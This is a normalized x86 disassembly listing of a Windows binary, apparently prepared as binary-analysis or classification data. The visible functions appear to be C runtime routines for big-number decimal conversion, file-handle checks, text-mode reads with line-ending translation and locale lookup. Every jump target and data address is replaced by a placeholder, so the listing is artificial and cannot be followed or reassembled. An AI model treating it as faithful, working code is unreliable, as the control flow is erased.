mov eax [ ebp - 0x76c ]
dec eax
jmp r-xdata
mov eax [ ebp - 0x76c ]
xor edi edi
mov esi eax
xor ecx ecx
mov edi esi
mov ecx [ ebp - 0x1d4 ]
cmp ecx 0x73
jae r-xdata
xor edi edi
xor esi esi
lea edx [ ebp - 0x1d0 ]
jmp r-xdata
lea edi [ ebp - 0x1d0 ]
lea edx [ ebp - 0x570 ]
cmp edi 0x1
je r-xdata
mov al 0x1
cmp [ ebp - 0x1d4 ] 0x0
je r-xdata
push eax
lea eax [ ebp - 0x1d0 ]
push ebx
push eax
call sub_41ed6e
add esp 0x10
xor esi esi
xor ecx ecx
push ebx
push eax
call sub_41ed6e
add esp 0x10
lea edx [ ebp - 0x3a0 ]
jmp r-xdata
lea edi [ ebp - 0x3a0 ]
lea edx [ ebp - 0x570 ]
cmp edi 0x1
je r-xdata
xor eax eax
mov [ ebp - 0x574 ] eax
mov [ ebp - 0x3a4 ] eax
push eax
lea eax [ ebp - 0x570 ]
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x3a4 ] 0x0
je r-xdata
push eax
lea eax [ ebp - 0x740 ]
mov esi [ ebp - 0x74c ]
mov ebx [ ebp - 0x1d4 ]
jmp r-xdata
mov eax [ ebp - 0x750 ]
sub edi 0x4
add eax eax
shr edx 0x1f
xor edx eax
mov eax [ ebp - 0x754 ]
dec esi
mov [ eax ] edx
sub eax 0x4
mov [ ebp - 0x754 ] eax
cmp esi 0xffffffff
je r-xdata
and [ ebp - 0x56c ] 0x0
xor eax eax
inc eax
mov [ ebp - 0x570 ] esi
mov [ ebp - 0x574 ] eax
mov [ ebp - 0x3a4 ] eax
push 0x4
jmp r-xdata
xor eax eax
mov eax [ ecx - 0x4 ]
jmp r-xdata
lea eax [ esi - 0x1 ]
cmp eax ebx
jae r-xdata
cmp [ ebp - 0x745 ] 0x0
mov ebx 0x1cc
je r-xdata
mov ecx esi
lea edi [ ebp - 0x1d0 ]
xor eax eax
[ edi ]
mov edx [ ebp - 0x754 ]
mov esi [ ebp - 0x750 ]
cmp esi ebx
jae r-xdata
mov eax [ ebp + 0x1c ]
dec eax
cmp eax ecx
jb r-xdata
cmp ecx 0x7fffffff
ja r-xdata
mov ecx [ ebp - 0x780 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x778 ]
test eax eax
js r-xdata
mov eax [ ebp + ecx * 4 - 0x3a0 ]
mul edx
push 0xa
add eax edi
mov [ ebp + ecx * 4 - 0x3a0 ] eax
adc edx 0x0
inc ecx
mov edi edx
pop edx
cmp ecx esi
jne r-xdata
mov esi [ ebp - 0x74c ]
test edi edi
je r-xdata
xor eax eax
push eax
mov [ ebp - 0x964 ] eax
mov [ ebp - 0x1d4 ] eax
lea eax [ ebp - 0x960 ]
push eax
lea eax [ ebp - 0x1d0 ]
push ebx
push eax
call sub_41ed6e
add esp 0x10
mov eax edx
mov [ ebp + ecx * 4 - 0x1d0 ] eax
inc [ ebp - 0x1d4 ]
jmp r-xdata
mul [ ebp + esi * 4 - 0x1d0 ]
add eax edi
mov [ ebp + esi * 4 - 0x1d0 ] eax
mov eax [ ebp - 0x764 ]
adc edx 0x0
inc esi
mov edi edx
cmp esi ecx
jne r-xdata
test edi edi
je r-xdata
mov [ ebp - 0x770 ] edx
test al al
jne r-xdata
mov [ ebp - 0x750 ] ecx
test al al
je r-xdata
mov ecx [ ebp - 0x1d4 ]
cmp [ ebp - 0x1d4 ] 0x0
je r-xdata
and [ ebp - 0x964 ] 0x0
and [ ebp - 0x1d4 ] 0x0
push 0x0
jmp r-xdata
mov eax [ ebp - 0x754 ]
sub eax [ ebp - 0x74c ]
mov [ ebp - 0x754 ] eax
jne r-xdata
mov eax [ ebp - 0x1d4 ]
xor ecx ecx
mov [ ebp - 0x764 ] eax
xor esi esi
mov eax edi
mul [ ebp + ecx * 4 - 0x3a0 ]
add eax esi
mov [ ebp + ecx * 4 - 0x3a0 ] eax
adc edx 0x0
inc ecx
mov esi edx
cmp ecx [ ebp - 0x764 ]
jne r-xdata
test esi esi
je r-xdata
mov [ ebp - 0x750 ] edx
test al al
jne r-xdata
mov [ ebp - 0x754 ] ecx
test al al
je r-xdata
mov ecx [ ebp - 0x3a4 ]
cmp [ ebp - 0x3a4 ] 0x0
je r-xdata
push eax
lea eax [ ebp - 0x3a0 ]
push ebx
push eax
call sub_41ed6e
add esp 0x10
and [ ebp - 0x964 ] 0x0
and [ ebp - 0x3a4 ] 0x0
push 0x0
mov eax [ ebp - 0x770 ]
sub eax [ ebp - 0x75c ]
mov [ ebp - 0x770 ] eax
jne r-xdata
mov eax [ ebp - 0x3a4 ]
xor ecx ecx
mov [ ebp - 0x758 ] eax
xor esi esi
cmp esi ebx
jae r-xdata
mov ebx [ ebp - 0x1d4 ]
jmp r-xdata
and edi [ ebp - 0x758 ]
and eax [ ebp - 0x774 ]
mov ecx [ ebp - 0x750 ]
shl edi cl
mov ecx [ ebp - 0x770 ]
shr eax cl
mov ecx [ ebp - 0x75c ]
or edi eax
mov eax [ ebp - 0x754 ]
sub ecx 0x4
mov [ ebp - 0x75c ] ecx
mov [ ebp + eax * 4 - 0x1d0 ] edi
dec eax
dec esi
mov [ ebp - 0x754 ] eax
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x1d4 ] edx
jmp r-xdata
lea eax [ edx + 0x1 ]
mov [ ebp - 0x1d4 ] eax
jmp r-xdata
xor edi edi
mov edi [ eax ]
jmp r-xdata
add eax [ ebp - 0x77c ]
mov [ ebp - 0x778 ] eax
cmp esi eax
je r-xdata
mov eax ecx
add ecx eax
mov eax [ ebp - 0x3a4 ]
cmp eax 0x73
jae r-xdata
mov eax [ ebp - 0x1d4 ]
cmp eax 0x73
jae r-xdata
xor edx edx
xor esi esi
mov [ ebp - 0x744 ] edx
test ecx ecx
je r-xdata
mov eax [ ebp - 0x1d4 ]
mov [ ebp - 0x760 ] eax
mov eax [ ebp - 0x1d4 ]
xor ecx ecx
mov [ ebp - 0x764 ] eax
xor esi esi
lea eax [ ebp - 0x960 ]
push eax
lea eax [ ebp - 0x1d0 ]
mov ecx [ ebp - 0x758 ]
mov eax edi
mul [ ebp + esi * 4 - 0x1d0 ]
add eax ecx
mov [ ebp + esi * 4 - 0x1d0 ] eax
adc edx 0x0
inc esi
mov ecx edx
cmp esi [ ebp - 0x764 ]
jne r-xdata
test ecx ecx
je r-xdata
mov eax [ ebp - 0x3a4 ]
cmp eax 0x73
jae r-xdata
xor edx edx
xor esi esi
mov [ ebp - 0x744 ] edx
test ecx ecx
je r-xdata
mov eax [ ebp - 0x3a4 ]
mov [ ebp - 0x760 ] eax
mov eax [ ebp - 0x3a4 ]
xor ecx ecx
mov [ ebp - 0x758 ] eax
xor esi esi
mov ecx [ ebp - 0x764 ]
mov eax edi
mul [ ebp + esi * 4 - 0x3a0 ]
add eax ecx
mov [ ebp + esi * 4 - 0x3a0 ] eax
adc edx 0x0
inc esi
mov ecx edx
cmp esi [ ebp - 0x758 ]
jne r-xdata
jmp r-xdata
cmp eax edx
jb r-xdata
and [ ebp - 0x56c ] 0x0
xor ecx ecx
push 0x4
pop eax
inc ecx
mov [ ebp - 0x570 ] eax
mov [ ebp - 0x574 ] ecx
mov [ ebp - 0x3a4 ] ecx
push eax
xor eax eax
mov eax [ ebp - 0x74c ]
mov eax [ eax - 0x4 ]
jmp r-xdata
lea eax [ esi - 0x1 ]
cmp eax ebx
jae r-xdata
mov [ esi ] 0x0
jmp r-xdata
mov eax [ ebp - 0x1d4 ]
test eax eax
je r-xdata
xor eax eax
push eax
mov [ ebp - 0x964 ] eax
mov [ ebp - 0x3a4 ] eax
lea eax [ ebp - 0x960 ]
push eax
lea eax [ ebp - 0x3a0 ]
push ebx
push eax
call sub_41ed6e
add esp 0x10
jmp r-xdata
mov [ ebp + eax * 4 - 0x3a0 ] edi
inc [ ebp - 0x3a4 ]
jmp r-xdata
mov [ ebp + eax * 4 - 0x1d0 ] edi
inc [ ebp - 0x1d4 ]
jmp r-xdata
mov eax edx
mov [ ebp - 0x1d4 ] edx
shl eax 0x2
push eax
lea eax [ ebp - 0x740 ]
lea eax [ ebp - 0x740 ]
sub edi eax
mov [ ebp - 0x784 ] edi
mov eax edi
mul [ ebp + esi * 4 - 0x1d0 ]
add eax ecx
mov [ ebp + esi * 4 - 0x1d0 ] eax
adc edx 0x0
inc esi
mov ecx edx
cmp esi [ ebp - 0x764 ]
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x1d4 ]
cmp eax 0x73
jae r-xdata
mov [ ebp + eax * 4 - 0x3a0 ] esi
inc [ ebp - 0x3a4 ]
jmp r-xdata
mov eax edx
mov [ ebp - 0x3a4 ] edx
shl eax 0x2
lea eax [ ebp - 0x740 ]
sub edi eax
mov [ ebp - 0x784 ] edi
mov eax edi
mul [ ebp + esi * 4 - 0x3a0 ]
add eax ecx
mov [ ebp + esi * 4 - 0x3a0 ] eax
adc edx 0x0
inc esi
mov ecx edx
cmp esi [ ebp - 0x758 ]
jne r-xdata
test ecx ecx
je r-xdata
mov ebx [ ebp - 0x1d4 ]
jmp r-xdata
and eax [ ebp - 0x774 ]
and edi [ ebp - 0x758 ]
mov ecx [ ebp - 0x770 ]
shr eax cl
mov ecx [ ebp - 0x75c ]
shl edi cl
mov ecx [ ebp - 0x760 ]
or eax edi
mov [ ebp + ecx * 4 - 0x1d0 ] eax
dec ecx
mov eax [ ebp - 0x74c ]
dec esi
sub eax 0x4
mov [ ebp - 0x760 ] ecx
mov [ ebp - 0x74c ] eax
cmp ecx 0xffffffff
je r-xdata
xor edi edi
mov esi eax
xor ecx ecx
xor eax eax
xor edi edi
mov ecx esi
mov [ ebp - 0x75c ] eax
cmp [ ebp - 0x760 ] eax
je r-xdata
cmp esi edx
jne r-xdata
xor eax eax
push eax
mov [ ebp - 0x964 ] eax
mov [ ebp - 0x1d4 ] eax
lea eax [ ebp - 0x960 ]
push eax
lea eax [ ebp - 0x1d0 ]
push ebx
push eax
call sub_41ed6e
add esp 0x10
xor al al
jmp r-xdata
mov [ ebp + eax * 4 - 0x1d0 ] ecx
inc [ ebp - 0x1d4 ]
jmp r-xdata
xor eax eax
xor edi edi
mov ecx esi
mov [ ebp - 0x74c ] eax
cmp [ ebp - 0x760 ] eax
je r-xdata
cmp esi edx
jne r-xdata
mov eax [ ebp - 0x3a4 ]
cmp eax 0x73
jb r-xdata
cmp ecx edx
jb r-xdata
mov eax [ ebp + ecx * 4 - 0x1d0 ]
mov edx 0x3b9aca00
mul edx
add eax edi
mov [ ebp + ecx * 4 - 0x1d0 ] eax
adc edx 0x0
inc ecx
mov edi edx
cmp ecx esi
jne r-xdata
mov esi [ ebp - 0x74c ]
test edi edi
je r-xdata
cmp ecx 0x73
je r-xdata
cmp ecx 0x73
je r-xdata
inc esi
cmp esi ecx
jne r-xdata
and [ ebp + esi * 4 - 0x740 ] eax
lea edx [ esi + 0x1 ]
mov [ ebp - 0x744 ] edx
jmp r-xdata
test al al
je r-xdata
cmp ecx 0x73
je r-xdata
cmp ecx 0x73
je r-xdata
inc esi
cmp esi ecx
jne r-xdata
and [ ebp + esi * 4 - 0x740 ] eax
lea edx [ esi + 0x1 ]
mov [ ebp - 0x744 ] edx
jmp r-xdata
mov [ ebp + eax * 4 - 0x3a0 ] ecx
inc [ ebp - 0x3a4 ]
jmp r-xdata
xor eax eax
mov [ ebp - 0x574 ] eax
mov [ ebp - 0x3a4 ] eax
push eax
lea eax [ ebp - 0x570 ]
jmp r-xdata
lea eax [ ebp - 0x3a4 ]
push eax
lea eax [ ebp - 0x1d4 ]
push eax
call sub_419c00
pop ecx
pop ecx
mov ecx [ ebp - 0x778 ]
push 0x8
pop edi
sub ecx esi
mov eax [ ebp - 0x1d4 ]
cmp eax 0x73
jae r-xdata
mov edi [ ebp - 0x784 ]
mov ecx [ ebp - 0x750 ]
test edi edi
je r-xdata
cmp ecx edx
jne r-xdata
lea eax [ edi + esi * 4 ]
mov eax [ ebp + eax - 0x740 ]
mov [ ebp - 0x764 ] eax
test eax eax
jne r-xdata
xor eax eax
mov [ ebp - 0x964 ] eax
mov [ ebp - 0x3a4 ] eax
push eax
lea eax [ ebp - 0x960 ]
mov edi [ ebp - 0x784 ]
mov ecx [ ebp - 0x754 ]
test edi edi
je r-xdata
cmp ecx edx
jne r-xdata
lea eax [ edi + esi * 4 ]
mov eax [ ebp + eax - 0x740 ]
mov [ ebp - 0x758 ] eax
test eax eax
jne r-xdata
push eax
lea eax [ ebp - 0x3a0 ]
push ebx
push eax
call sub_41ed6e
add esp 0x10
xor al al
jmp r-xdata
dec edi
cmp edi 0xffffffff
jne r-xdata
mov [ edi + esi ] dl
xor eax eax
push eax
mov [ ebp - 0x964 ] eax
mov [ ebp - 0x1d4 ] eax
lea eax [ ebp - 0x960 ]
push eax
lea eax [ ebp - 0x1d0 ]
push ebx
push eax
call sub_41ed6e
add esp 0x10
mov [ ebp + eax * 4 - 0x1d0 ] edi
inc [ ebp - 0x1d4 ]
jmp r-xdata
cmp ecx 0x73
je r-xdata
mov edx [ ebp - 0x770 ]
mov eax [ edx + eax * 4 ]
mul [ ebp - 0x764 ]
add eax edi
adc edx 0x0
add [ ebp + ecx * 4 - 0x740 ] eax
mov eax [ ebp - 0x75c ]
adc edx 0x0
inc eax
inc ecx
mov [ ebp - 0x75c ] eax
mov edi edx
mov edx [ ebp - 0x744 ]
cmp eax [ ebp - 0x760 ]
jne r-xdata
and [ ebp + ecx * 4 - 0x740 ] 0x0
inc eax
add eax esi
mov [ ebp - 0x744 ] eax
mov eax [ ebp - 0x75c ]
test al al
je r-xdata
cmp ecx 0x73
je r-xdata
mov edx [ ebp - 0x750 ]
mov eax [ edx + eax * 4 ]
mul [ ebp - 0x758 ]
add eax edi
adc edx 0x0
add [ ebp + ecx * 4 - 0x740 ] eax
mov eax [ ebp - 0x74c ]
adc edx 0x0
inc eax
inc ecx
mov [ ebp - 0x74c ] eax
mov edi edx
mov edx [ ebp - 0x744 ]
cmp eax [ ebp - 0x760 ]
jne r-xdata
and [ ebp + ecx * 4 - 0x740 ] 0x0
inc eax
add eax esi
mov [ ebp - 0x744 ] eax
mov eax [ ebp - 0x74c ]
xor edx edx
div [ ebp - 0x774 ]
add dl 0x30
cmp ecx edi
jb r-xdata
cmp ecx 0x9
jbe r-xdata
cmp ecx edx
jne r-xdata
cmp ecx edx
jne r-xdata
add esi ecx
mov [ ebp - 0x74c ] esi
cmp esi [ ebp - 0x778 ]
jne r-xdata
push 0x9
pop ecx
mov eax edi
xor edi edi
add [ ebp + ecx * 4 - 0x740 ] eax
mov edx [ ebp - 0x744 ]
adc edi edi
inc ecx
jmp r-xdata
and [ ebp + ecx * 4 - 0x740 ] 0x0
lea eax [ ecx + 0x1 ]
mov [ ebp - 0x744 ] eax
mov eax edi
xor edi edi
add [ ebp + ecx * 4 - 0x740 ] eax
mov edx [ ebp - 0x744 ]
adc edi edi
inc ecx
jmp r-xdata
and [ ebp + ecx * 4 - 0x740 ] 0x0
lea eax [ ecx + 0x1 ]
mov [ ebp - 0x744 ] eax
sub_426370
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_41529e
mov [ eax ] 0x9
jmp r-xdata
call sub_41529e
mov [ eax ] 0x9
call sub_413b01
cmp ecx [ rw-data ]
jae r-xdata
xor eax eax
pop ebp
retn
mov eax ecx
and ecx 0x3f
sar eax 0x6
imul ecx ecx 0x30
mov eax [ eax * 4 + rw-data ]
movzx eax [ eax + ecx + 0x28 ]
and eax 0x40
pop ebp
retn
sub_4263c6
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
xor edi edi
mov ebx 0xe3
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] ebx
mov edx eax
cmp ax bx
ja r-xdata
add esi 0x2
sub [ ebp - 0x4 ] 0x1
je r-xdata
cmp ax bx
ja r-xdata
add eax 0x20
movzx edx ax
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edi [ ebp - 0xc ]
mov ebx [ ebp - 0x8 ]
movzx eax ax
movzx edx dx
sub edx eax
je r-xdata
test dx dx
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ esi ]
cmp ax di
jb r-xdata
mov eax [ ecx * 8 + r--data ]
test edx edx
jns r-xdata
cmp dx ax
je r-xdata
lea edi [ ecx + 0x1 ]
mov [ ebp - 0xc ] edi
lea ebx [ ecx - 0x1 ]
mov [ ebp - 0x8 ] ebx
jmp r-xdata
movzx eax [ ecx + esi ]
cmp ax di
jb r-xdata
lea eax [ ebx + edi ]
mov [ ebp - 0x4 ] 0x55
cdq
sub eax edx
mov ecx eax
sar ecx 0x1
push 0x41
pop edi
mov [ ebp - 0x10 ] ecx
mov esi [ ecx * 8 + r--data ]
mov ecx [ ebp + 0x8 ]
push 0x5a
sub ecx esi
pop ebx
or eax 0xffffffff
jmp r-xdata
cmp edi ebx
jle r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_426482
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
push esi
push edi
test ecx ecx
je r-xdata
xor eax eax
cmp ecx 0x400
je r-xdata
cmp ecx 0x800
je r-xdata
cmp [ ebp + 0xc ] 0x0
mov esi [ ebp + 0x10 ]
jne r-xdata
test esi esi
js r-xdata
test esi esi
jg r-xdata
xor edi edi
mov ebx 0xe3
test eax eax
js r-xdata
test edx edx
jns r-xdata
mov ebx [ eax * 8 + r--data ]
push 0x55
push ebx
call sub_41a56a
mov edi eax
pop ecx
pop ecx
test esi esi
jle r-xdata
lea edi [ eax + 0x1 ]
lea ebx [ eax - 0x1 ]
jmp r-xdata
lea eax [ edi + 0x1 ]
jmp r-xdata
cmp edi esi
jge r-xdata
lea eax [ ebx + edi ]
cdq
sub eax edx
mov edx ecx
sar eax 0x1
sub edx [ eax * 8 + r--data ]
je r-xdata
or eax 0xffffffff
cmp edi ebx
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push esi
push [ ebp + 0xc ]
call sub_41a3df
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_413b2e
int3
sub_42652c
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call sub_4263c6
pop ecx
test eax eax
js r-xdata
cmp eax 0xe4
jae r-xdata
mov eax [ eax * 8 + r--data ]
pop ebp
retn
sub_426558
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
and eax 0x3f
mov edx [ ebp + 0xc ]
push ebx
sar ecx 0x6
push esi
push edi
imul edi eax 0x30
mov eax [ ecx * 4 + rw-data ]
mov [ ebp - 0x10 ] ecx
mov ecx [ eax + edi + 0x18 ]
mov [ ebp - 0x14 ] ecx
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
and [ eax + edi + 0x28 ] 0xfb
cmp [ edx ] 0xa
jne r-xdata
sub esi edx
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ edx + 0x1 ]
or [ eax + edi + 0x28 ] 0x4
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx * 4 + rw-data ]
mov al [ ecx + edi + 0x28 ]
test al 0x40
jne r-xdata
cmp cl 0xd
je r-xdata
lea eax [ edx + ecx ]
mov ebx edx
mov [ ebp - 0x8 ] eax
mov esi edx
cmp edx eax
jae r-xdata
mov cl [ ebx ]
mov [ esi ] cl
inc esi
or al 0x2
mov [ ecx + edi + 0x28 ] al
jmp r-xdata
mov ecx [ ebp - 0x8 ]
cmp eax ecx
jae r-xdata
mov [ esi ] cl
inc esi
inc ebx
inc eax
jmp r-xdata
inc ebx
inc eax
push 0x0
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
push [ ebp - 0x14 ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
cmp [ eax ] 0xa
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov [ esi ] 0xd
inc esi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov [ esi ] 0xd
inc esi
inc ebx
inc eax
jmp r-xdata
add ebx 0x2
mov [ esi ] 0xa
add eax 0x2
inc esi
jmp r-xdata
mov cl [ ebx ]
cmp cl 0x1a
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov eax [ ecx * 4 + rw-data ]
test [ eax + edi + 0x28 ] 0x48
je r-xdata
cmp ebx ecx
jb r-xdata
cmp [ ebp - 0x1 ] 0xa
jne r-xdata
mov dl [ ebp - 0x1 ]
cmp dl 0xa
jne r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push [ ebp + 0x8 ]
call sub_41da40
add esp 0x10
cmp [ ebp - 0x1 ] 0xa
je r-xdata
mov edx [ ebp + 0xc ]
cmp esi edx
jne r-xdata
mov [ esi ] 0xd
mov eax [ ecx * 4 + rw-data ]
mov [ eax + edi + 0x2a ] dl
jmp r-xdata
mov [ esi ] dl
jmp r-xdata
mov edx [ ebp + 0xc ]
mov [ esi ] 0xa
inc esi
jmp r-xdata
mov eax [ ebp - 0xc ]
sub_4266af
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
and eax 0x3f
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
sar ecx 0x6
imul edi eax 0x30
mov [ ebp - 0x8 ] ecx
push 0xa
mov eax [ ecx * 4 + rw-data ]
pop ebx
mov edx [ eax + edi + 0x18 ]
mov [ ebp - 0x14 ] edx
mov edx [ ebp + 0xc ]
test esi esi
je r-xdata
and [ eax + edi + 0x28 ] 0xfb
cmp [ edx ] bx
jne r-xdata
sub esi edx
and esi 0xfffffffe
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ edx + 0x2 ]
or [ eax + edi + 0x28 ] 0x4
jmp r-xdata
mov ecx [ ecx * 4 + rw-data ]
mov al [ ecx + edi + 0x28 ]
test al 0x40
jne r-xdata
push 0xd
pop edx
cmp [ ebp - 0xc ] dx
mov edx [ ebp + 0xc ]
je r-xdata
lea eax [ edx + esi * 2 ]
mov ebx edx
mov [ ebp - 0x10 ] eax
mov esi edx
cmp edx eax
jae r-xdata
mov cx [ ebx ]
mov [ esi ] cx
add esi 0x2
or al 0x2
mov [ ecx + edi + 0x28 ] al
jmp r-xdata
cmp eax [ ebp - 0x10 ]
jae r-xdata
mov ecx [ ebp - 0xc ]
add ebx 0x2
mov [ esi ] cx
add esi 0x2
add eax 0x2
jmp r-xdata
add eax 0x2
add ebx 0x2
push 0x0
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x18 ]
push eax
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push [ ebp - 0x14 ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
push 0xa
pop edx
cmp [ eax ] dx
mov edx [ ebp + 0xc ]
jne r-xdata
cmp ebx [ ebp - 0x10 ]
jb r-xdata
push 0xd
pop eax
mov [ esi ] ax
add esi 0x2
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0xd
pop edx
mov [ esi ] dx
add ebx 0x2
add esi 0x2
add eax 0x2
jmp r-xdata
push 0xa
pop ecx
add ebx 0x4
mov [ esi ] cx
add eax 0x4
add esi 0x2
jmp r-xdata
movzx ecx [ ebx ]
mov [ ebp - 0xc ] ecx
cmp ecx 0x1a
mov ecx [ ebp - 0x8 ]
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x8 ]
push 0xa
mov eax [ ecx * 4 + rw-data ]
test [ eax + edi + 0x28 ] 0x48
pop eax
je r-xdata
mov edx [ ebp + 0xc ]
cmp [ ebp - 0x4 ] ax
jne r-xdata
mov dx [ ebp - 0x4 ]
cmp dx ax
jne r-xdata
push 0x1
push 0xffffffff
push 0xfffffffe
push [ ebp + 0x8 ]
call sub_41da40
add esp 0x10
push 0xa
pop eax
cmp [ ebp - 0x4 ] ax
je r-xdata
mov edx [ ebp + 0xc ]
cmp esi edx
jne r-xdata
push 0xd
pop eax
mov [ esi ] ax
mov eax [ ecx * 4 + rw-data ]
push 0xa
mov [ eax + edi + 0x2a ] dl
mov eax [ ecx * 4 + rw-data ]
mov [ eax + edi + 0x2b ] dh
mov eax [ ecx * 4 + rw-data ]
pop edx
mov [ eax + edi + 0x2c ] dl
jmp r-xdata
mov [ esi ] ax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ esi ] ax
add esi 0x2
mov eax [ ebp - 0xc ]
jmp r-xdata
sub_42686f
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
push ebx
push [ ebp + 0x8 ]
call sub_426558
mov ecx eax
add esp 0xc
test ecx ecx
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
and eax 0x3f
sar edx 0x6
push edi
imul edi eax 0x30
mov [ ebp - 0x4 ] edx
mov eax [ edx * 4 + rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ eax + edi + 0x29 ] 0x0
jne r-xdata
push esi
lea esi [ ebx - 0x1 ]
add esi ecx
mov al [ esi ]
test al al
js r-xdata
mov eax ecx
jmp r-xdata
xor edx edx
movzx eax al
inc edx
jmp r-xdata
inc esi
jmp r-xdata
pop edi
cmp [ eax + rw-data ] 0x0
je r-xdata
push [ ebp + 0x18 ]
sub esi ebx
push [ ebp + 0x14 ]
push esi
push ebx
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov edx eax
test edx edx
jne r-xdata
cmp edx 0x4
ja r-xdata
mov cl [ esi ]
movzx eax cl
movsx eax [ eax + rw-data ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp edx esi
mov ecx [ eax * 4 + rw-data ]
setne al
add al al
xor al [ ecx + edi + 0x2d ]
and al 0x2
xor [ ecx + edi + 0x2d ] al
lea eax [ edx + edx ]
call [ GetLastError@IAT ]
push eax
call sub_415268
pop ecx
cmp esi ebx
jb r-xdata
inc eax
cmp eax edx
jne r-xdata
call sub_41529e
mov [ eax ] 0x2a
jmp r-xdata
pop esi
dec esi
inc edx
movzx eax [ esi ]
mov eax [ ebp - 0x8 ]
test [ eax + edi + 0x28 ] 0x48
je r-xdata
add esi edx
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
neg edx
mov eax edx
push 0x1
cdq
push edx
push eax
push [ ebp + 0x8 ]
call sub_41da40
add esp 0x10
inc esi
mov [ eax + edi + 0x2a ] cl
cmp edx 0x2
jb r-xdata
cmp edx 0x3
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov al [ esi ]
inc esi
mov ecx [ ecx * 4 + rw-data ]
mov [ ecx + edi + 0x2b ] al
sub esi edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax * 4 + rw-data ]
mov al [ esi ]
inc esi
mov [ ecx + edi + 0x2c ] al
sub_4269bf
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi edi
lea edx [ edi + eax * 2 ]
mov eax edi
cmp edi edx
jae r-xdata
sub esi edi
and esi 0xfffffffe
pop edi
mov eax esi
pop esi
pop ebp
retn
lea ecx [ edi + 0x2 ]
push ebx
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x3f
sar ecx 0x6
imul edx eax 0x30
mov ecx [ ecx * 4 + rw-data ]
or [ ecx + edx + 0x28 ] 0x2
cmp ebx 0xd
jne r-xdata
mov [ esi ] bx
add eax 0x2
add esi 0x2
add ecx 0x2
cmp ecx edx
jae r-xdata
movzx ebx [ eax ]
cmp ebx 0x1a
je r-xdata
jmp r-xdata
push 0xa
pop edi
cmp [ ecx ] di
mov edi [ ebp + 0xc ]
jne r-xdata
pop ebx
push 0xa
pop ebx
add eax 0x4
mov [ esi ] bx
add ecx 0x4
add esi 0x2
jmp r-xdata
cmp eax edx
jb r-xdata
sub_426a40
push 0x14
push r--data
call sub_40e2a0
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_41528b
and [ eax ] 0x0
call sub_41529e
mov [ eax ] 0x9
jmp r-xdata
call sub_41528b
and [ eax ] 0x0
call sub_41529e
mov [ eax ] 0x9
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov ebx esi
sar ebx 0x6
mov eax esi
and eax 0x3f
imul ecx eax 0x30
mov [ ebp - 0x20 ] ecx
mov eax [ ebx * 4 + rw-data ]
movzx eax [ eax + ecx + 0x28 ]
and eax 0x1
je r-xdata
mov eax 0x7fffffff
cmp eax [ ebp + 0x10 ]
sbb eax eax
add eax 0x1
jne r-xdata
push esi
call sub_41f919
pop ecx
or edi 0xffffffff
mov [ ebp - 0x1c ] edi
and [ ebp - 0x4 ] 0x0
mov eax [ ebx * 4 + rw-data ]
mov ecx [ ebp - 0x20 ]
test [ eax + ecx + 0x28 ] 0x1
jne r-xdata
call sub_41528b
and [ eax ] 0x0
call sub_41529e
mov [ eax ] 0x16
jmp r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_426b53
add esp 0xc
mov edi eax
mov [ ebp - 0x1c ] edi
call sub_41529e
mov [ eax ] 0x9
call sub_41528b
and [ eax ] 0x0
